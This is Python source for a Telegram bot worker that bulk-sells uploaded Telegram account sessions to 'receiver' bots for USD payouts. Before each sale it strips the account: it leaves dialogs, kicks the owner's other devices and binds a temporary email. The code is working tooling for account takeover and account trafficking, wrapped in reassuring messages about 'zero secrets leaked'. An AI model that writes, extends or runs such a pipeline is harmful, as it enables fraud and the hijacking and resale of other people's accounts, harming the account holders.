import asyncio
import logging
import time
from typing import Optional, Dict
from aiogram import Bot
from database.repository import DatabaseRepository
from database.models import JobRecord, JobStage, SessionItem
from services.job_manager import JobManager
from services.audit_service import AuditService
from services.zip_validator import ZipValidator
from trading.cleaner import AccountCleaner
from trading.otp_service import OtpService
from trading.verifier import AccountVerifier
from trading.operator_pool import OperatorPool
from trading.receiver_adapter import ReceiverAdapter
import config

logger = logging.getLogger("tgbitz.autosell.worker")


class SellingWorker:
    def __init__(
        self,
        bot: Optional[Bot] = None,
        repo: Optional[DatabaseRepository] = None,
        cleaner: Optional[AccountCleaner] = None,
        operator_pool: Optional[OperatorPool] = None,
        receiver_adapter: Optional[ReceiverAdapter] = None
    ):
        self.bot = bot
        self.repo = repo if repo is not None else DatabaseRepository()
        self.audit = AuditService(self.repo)
        self.job_manager = JobManager(self.repo, self.audit)
        self.zip_validator = ZipValidator()

        self.cleaner = cleaner or AccountCleaner(config.API_ID, config.API_HASH)
        self.otp_service = OtpService(config.API_ID, config.API_HASH)
        self.verifier = AccountVerifier(config.API_ID, config.API_HASH)
        self.operator_pool = operator_pool or OperatorPool(config.API_ID, config.API_HASH)
        self.receiver_adapter = receiver_adapter or ReceiverAdapter(self.otp_service, self.verifier)

        self._running_jobs = set()

    async def launch_selling_batch(self, job_id: str, actor_id: int):
        """Launches background task to process the selling job."""
        if job_id in self._running_jobs:
            return
        self._running_jobs.add(job_id)
        asyncio.create_task(self._process_job_loop(job_id, actor_id))

    async def _process_job_loop(self, job_id: str, actor_id: int):
        try:
            job = self.repo.get_job(job_id)
            if not job:
                return

            self.job_manager.mark_selling_started(job_id, actor_id)
            items = self.repo.get_session_items_for_job(job_id)
            pending_items = [it for it in items if it.status == "pending"]

            logger.info(f"🚀 [Selling Worker] Started job {job_id} ({len(pending_items)} accounts)...")

            # Notify Admin Log GC
            if self.bot and config.ADMINLOG_ID:
                try:
                    await self.bot.send_message(
                        chat_id=int(config.ADMINLOG_ID),
                        text=(
                            f"⚡ <b>AUTO-SELL BATCH STARTED — {job_id}</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"👑 <b>Supervisor:</b> @bitz_owner @jameendar\n"
                            f"• 📦 <b>Accounts in Queue:</b> {len(pending_items)}\n"
                            f"• 👥 <b>Operators Assigned:</b> {len(job.operator_distribution)}\n"
                            f"• 🎯 <b>Target Receiver:</b> {job.selected_receiver or 'Auto Highest-Yield'}\n"
                            f"<i>Processing accounts 1-by-1 with zero secret leakage...</i>"
                        ),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

            sold_count = 0
            failed_count = 0
            total_payout = 0.0

            # Group items by assigned operator
            items_by_op: Dict[str, list] = {}
            for it in pending_items:
                op = it.assigned_operator_id or "default"
                items_by_op.setdefault(op, []).append(it)

            # Process sequentially per operator to avoid floodwaits
            for op_id, op_items in items_by_op.items():
                # Connect operator client
                op_client, op_err = await self.operator_pool.get_client_for_operator(op_id)
                if not op_client:
                    logger.error(f"Cannot process accounts for operator {op_id}: {op_err}")
                    for it in op_items:
                        self.repo.update_session_item(it.session_id, {
                            "status": "failed",
                            "error_msg": f"Operator {op_id} unavailable: {op_err}"
                        })
                        failed_count += 1
                    continue

                for it in op_items:
                    phone_disp = it.phone_masked or "Unknown"
                    logger.info(f"🔄 [{job_id}] Processing {phone_disp} via operator {op_id}...")

                    # 1. Clean Account (Leave dialogs, kick devices, bind temp mail)
                    self.repo.update_session_item(it.session_id, {"status": "cleaning"})
                    clean_ok, clean_msg, bound_mail = await self.cleaner.isolate_and_clean_session(
                        it.session_encrypted, phone_masked=phone_disp
                    )
                    if not clean_ok:
                        logger.warning(f"Account cleaning failed for {phone_disp}: {clean_msg}")
                        self.repo.update_session_item(it.session_id, {
                            "status": "failed",
                            "error_msg": f"Cleaning error: {clean_msg}"
                        })
                        failed_count += 1
                        continue

                    # 2. Select Receiver Profile
                    target_rec = None
                    if job.selected_receiver and job.selected_receiver in self.receiver_adapter.receivers:
                        target_rec = self.receiver_adapter.receivers[job.selected_receiver]
                    else:
                        best_pair = self.receiver_adapter.get_best_receiver_for_country(it.country_iso)
                        if best_pair:
                            target_rec, _ = best_pair

                    if not target_rec:
                        self.repo.update_session_item(it.session_id, {
                            "status": "failed",
                            "error_msg": f"No active receiver found for country {it.country_iso}"
                        })
                        failed_count += 1
                        continue

                    # 3. Execute Sale to Receiver
                    self.repo.update_session_item(it.session_id, {
                        "status": "selling",
                        "target_receiver_id": target_rec.id,
                        "target_receiver_username": target_rec.bot_username
                    })
                    sell_ok, price, sell_msg = await self.receiver_adapter.execute_sell_flow(
                        operator_client=op_client,
                        receiver=target_rec,
                        session_encrypted=it.session_encrypted,
                        phone=it.phone or "",
                        phone_masked=phone_disp
                    )

                    if sell_ok:
                        sold_count += 1
                        total_payout += price
                        self.repo.update_session_item(it.session_id, {
                            "status": "sold",
                            "payout_usd": price,
                            "error_msg": None
                        })
                        logger.info(f"✅ [{job_id}] Sold {phone_disp} -> @{target_rec.bot_username} (+${price:.2f})")
                    else:
                        failed_count += 1
                        self.repo.update_session_item(it.session_id, {
                            "status": "failed",
                            "error_msg": sell_msg
                        })
                        logger.warning(f"❌ [{job_id}] Sale failed for {phone_disp}: {sell_msg}")

                    # Brief gap between accounts
                    await asyncio.sleep(3.0)

            # 4. Finalize Job
            self.job_manager.complete_job(job_id, actor_id, sold_count, failed_count, total_payout)

            # Cleanup temp extracted directory for upload
            upload = self.repo.get_upload(job.upload_id)
            if upload:
                import os
                up_dir = os.path.join(config.TEMP_STORAGE_DIR, f"upload_{upload.upload_id}")
                self.zip_validator.cleanup_extracted(up_dir)

            # Notify Admin Log GC with Final Report
            if self.bot and config.ADMINLOG_ID:
                try:
                    await self.bot.send_message(
                        chat_id=int(config.ADMINLOG_ID),
                        text=(
                            f"🎉 <b>AUTO-SELL BATCH COMPLETED — {job_id}</b> 💰\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"👑 <b>Supervisor:</b> @bitz_owner @jameendar\n"
                            f"• 📊 <b>Total Uploaded:</b> {len(pending_items)}\n"
                            f"• ✅ <b>Successfully Sold:</b> <b>{sold_count}</b>\n"
                            f"• ❌ <b>Failed / Held:</b> {failed_count}\n"
                            f"• 💵 <b>Total Revenue:</b> <b>+${total_payout:.2f} USD</b>\n\n"
                            f"<i>Temporary extracted files wiped cleanly. Zero secrets stored or leaked.</i>"
                        ),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

            # Notify User / Uploader
            if self.bot and job.user_id:
                try:
                    await self.bot.send_message(
                        chat_id=job.user_id,
                        text=(
                            f"✅ <b>ZIP PROCESSING & AUTO-SELL COMPLETED</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                            f"• 🆔 <b>Job ID:</b> <code>{job.job_id}</code>\n"
                            f"• 📱 <b>Accounts Sold:</b> <b>{sold_count} / {len(pending_items)}</b>\n"
                            f"• 💰 <b>Total Earnings:</b> <b>${total_payout:.2f} USD</b>\n"
                            f"• 🔒 <b>Security:</b> Local sessions terminated; no credentials shared."
                        ),
                        parse_mode="HTML"
                    )
                except Exception:
                    pass

        except Exception as e:
            logger.error(f"Fatal error in job loop {job_id}: {e}")
            self.repo.update_job_stage(job_id, JobStage.FAILED, safe_error=str(e)[:100])
        finally:
            self._running_jobs.discard(job_id)
